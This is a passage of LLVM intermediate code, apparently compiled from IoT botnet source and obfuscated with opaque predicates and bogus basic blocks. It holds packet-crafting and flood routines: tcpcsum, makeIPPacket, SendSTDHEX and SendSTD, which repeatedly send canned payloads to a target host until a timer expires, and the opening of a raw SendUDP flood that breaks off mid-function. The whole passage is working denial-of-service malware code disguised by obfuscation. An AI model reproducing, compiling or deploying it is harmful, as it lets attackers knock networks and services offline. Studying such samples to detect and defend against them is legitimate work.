  %93 = alloca i64, align 8
  store i16* %0, i16** %91, align 8
  store i32 %1, i32* %92, align 4
  store i64 0, i64* %93, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %94 = load i16*, i16** %11, align 8
  %95 = bitcast i16* %94 to i8*
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i64
  %98 = load i64, i64* %13, align 8
  %_ = sub i64 %98, %97
  %gen = mul i64 %_, %97
  %_2 = sub i64 %98, %97
  %gen3 = mul i64 %_2, %97
  %_4 = sub i64 %98, %97
  %gen5 = mul i64 %_4, %97
  %_6 = sub i64 0, %98
  %gen7 = add i64 %_6, %97
  %_8 = sub i64 0, %98
  %gen9 = add i64 %_8, %97
  %_10 = shl i64 %98, %97
  %_11 = sub i64 %98, %97
  %gen12 = mul i64 %_11, %97
  %99 = add i64 %98, %97
  store i64 %99, i64* %13, align 8
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %65
  %100 = load i64, i64* %13, align 8
  %_17 = sub i64 %100, 65535
  %gen18 = mul i64 %_17, 65535
  %_19 = sub i64 0, %100
  %gen20 = add i64 %_19, 65535
  %101 = and i64 %100, 65535
  %102 = load i64, i64* %13, align 8
  %_21 = shl i64 %102, 16
  %_22 = sub i64 %102, 16
  %gen23 = mul i64 %_22, 16
  %_24 = sub i64 %102, 16
  %gen25 = mul i64 %_24, 16
  %103 = lshr i64 %102, 16
  %_26 = sub i64 %101, %103
  %gen27 = mul i64 %_26, %103
  %_28 = sub i64 0, %101
  %gen29 = add i64 %_28, %103
  %_30 = sub i64 %101, %103
  %gen31 = mul i64 %_30, %103
  %_32 = sub i64 %101, %103
  %gen33 = mul i64 %_32, %103
  %_34 = sub i64 %101, %103
  %gen35 = mul i64 %_34, %103
  %104 = add i64 %101, %103
  store i64 %104, i64* %13, align 8
  br label %originalBB16
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.59
  %3 = load i32, i32* @y.60
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.59
  %15 = load i32, i32* @y.60
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %39

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  store i32 1, i32* %10, align 4
  %31 = load i32, i32* @x.59
  %32 = load i32, i32* @y.60
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* %11, align 4
  %41 = call i32 @close(i32 %40)
  store i32 0, i32* %10, align 4
  br label %42

; <label>:42:                                     ; preds = %39, %originalBBpart24
  %43 = load i32, i32* @x.59
  %44 = load i32, i32* @y.60
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = load i32, i32* %10, align 4
  %52 = load i32, i32* @x.59
  %53 = load i32, i32* @y.60
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %51

originalBBalteredBB:                              ; preds = %originalBB, %1
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  store i32 %0, i32* %61, align 4
  %62 = load i32, i32* %61, align 4
  %63 = icmp sgt i32 3, %62
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  store i32 1, i32* %10, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %64 = load i32, i32* %10, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTDHEX(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #5
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #5
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %107, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @SendSTDHEX.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %107

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* @x.61
  %43 = load i32, i32* @y.62
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* %7, align 4
  %51 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %52 = bitcast i8** %51 to i8*
  %53 = call i64 @send(i32 %50, i8* %52, i64 1460, i32 0)
  %54 = load i32, i32* %7, align 4
  %55 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = call i64 @time(i64* null) #5
  %58 = load i64, i64* %8, align 8
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = icmp sge i64 %57, %61
  %63 = load i32, i32* @x.61
  %64 = load i32, i32* @y.62
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %62, label %71, label %90

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = load i32, i32* @x.61
  %73 = load i32, i32* @y.62
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %71
  %80 = load i32, i32* %7, align 4
  %81 = call i32 @close(i32 %80)
  call void @_exit(i32 0) #11
  %82 = load i32, i32* @x.61
  %83 = load i32, i32* @y.62
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  unreachable

; <label>:90:                                     ; preds = %originalBBpart2
  %91 = load i32, i32* @x.61
  %92 = load i32, i32* @y.62
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %90
  store i32 0, i32* %11, align 4
  %99 = load i32, i32* @x.61
  %100 = load i32, i32* @y.62
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %107

; <label>:107:                                    ; preds = %originalBBpart210, %37
  %108 = load i32, i32* %11, align 4
  %109 = add i32 %108, 1
  store i32 %109, i32* %11, align 4
  br label %37
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  %111 = load i32, i32* %7, align 4
  %112 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %113 = bitcast i8** %112 to i8*
  %114 = call i64 @send(i32 %111, i8* %113, i64 1460, i32 0)
  %115 = load i32, i32* %7, align 4
  %116 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %117 = call i32 @connect(i32 %115, %struct.sockaddr* %116, i32 16)
  %118 = call i64 @time(i64* null) #5
  %119 = load i64, i64* %8, align 8
  %120 = load i32, i32* %6, align 4
  %121 = sext i32 %120 to i64
  %_ = sub i64 0, %119
  %gen = add i64 %_, %121
  %_1 = sub i64 0, %119
  %gen2 = add i64 %_1, %121
  %_3 = shl i64 %119, %121
  %122 = add nsw i64 %119, %121
  %123 = icmp sge i64 %118, %122
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %71
  %124 = load i32, i32* %7, align 4
  %125 = call i32 @close(i32 %124)
  call void @_exit(i32 0) #11
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %90
  store i32 0, i32* %11, align 4
  br label %originalBB8
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %originalBBpart214, %3
  %39 = load i32, i32* @x.63
  %40 = load i32, i32* @y.64
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %47, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %48 = call i32 @rand() #5
  %49 = sext i32 %48 to i64
  %50 = urem i64 %49, 26
  %51 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %50
  %52 = load i8*, i8** %51, align 8
  store i8* %52, i8** %13, align 8
  %53 = load i32, i32* %11, align 4
  %54 = icmp uge i32 %53, 50
  %55 = load i32, i32* @x.63
  %56 = load i32, i32* @y.64
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %54, label %63, label %80

; <label>:63:                                     ; preds = %originalBBpart2
  %64 = load i32, i32* %7, align 4
  %65 = load i8*, i8** %13, align 8
  %66 = call i64 @send(i32 %64, i8* %65, i64 69, i32 0)
  %67 = load i32, i32* %7, align 4
  %68 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %69 = call i32 @connect(i32 %67, %struct.sockaddr* %68, i32 16)
  %70 = call i64 @time(i64* null) #5
  %71 = load i64, i64* %8, align 8
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = icmp sge i64 %70, %74
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %63
  %77 = load i32, i32* %7, align 4
  %78 = call i32 @close(i32 %77)
  call void @_exit(i32 0) #11
  unreachable

; <label>:79:                                     ; preds = %63
  store i32 0, i32* %11, align 4
  br label %80

; <label>:80:                                     ; preds = %79, %originalBBpart2
  %81 = load i32, i32* @x.63
  %82 = load i32, i32* @y.64
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %80
  %89 = load i32, i32* %11, align 4
  %90 = add i32 %89, 1
  store i32 %90, i32* %11, align 4
  %91 = load i32, i32* @x.63
  %92 = load i32, i32* @y.64
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart214, label %originalBB7alteredBB

originalBBpart214:                                ; preds = %originalBB7
  br label %38
                                                  ; No predecessors!
  %100 = load i32, i32* @x.63
  %101 = load i32, i32* @y.64
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %99
  %108 = load i32, i32* @x.63
  %109 = load i32, i32* @y.64
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %38
  %116 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %116, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %117 = call i32 @rand() #5
  %118 = sext i32 %117 to i64
  %_ = sub i64 0, %118
  %gen = add i64 %_, 26
  %_1 = shl i64 %118, 26
  %_2 = shl i64 %118, 26
  %_3 = sub i64 0, %118
  %gen4 = add i64 %_3, 26
  %_5 = sub i64 %118, 26
  %gen6 = mul i64 %_5, 26
  %119 = urem i64 %118, 26
  %120 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %119
  %121 = load i8*, i8** %120, align 8
  store i8* %121, i8** %13, align 8
  %122 = load i32, i32* %11, align 4
  %123 = icmp uge i32 %122, 50
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %80
  %124 = load i32, i32* %11, align 4
  %_8 = shl i32 %124, 1
  %_9 = sub i32 %124, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 0, %124
  %gen12 = add i32 %_11, 1
  %125 = add i32 %124, 1
  store i32 %125, i32* %11, align 4
  br label %originalBB7

originalBB16alteredBB:                            ; preds = %originalBB16, %99
  br label %originalBB16
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.65
  %8 = load i32, i32* @y.66
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* %16, align 4
  %34 = icmp eq i32 %33, 0
  %35 = load i32, i32* @x.65
  %36 = load i32, i32* @y.66
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = call i32 @rand_cmwc()
  %45 = trunc i32 %44 to i16
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  br label %52

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* %16, align 4
  %49 = trunc i32 %48 to i16
  %50 = call zeroext i16 @htons(i16 zeroext %49) #10
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  br label %52

; <label>:52:                                     ; preds = %47, %43
  %53 = load i8*, i8** %15, align 8
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %55 = call i32 @getHost(i8* %53, %struct.in_addr* %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %366

; <label>:58:                                     ; preds = %52
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
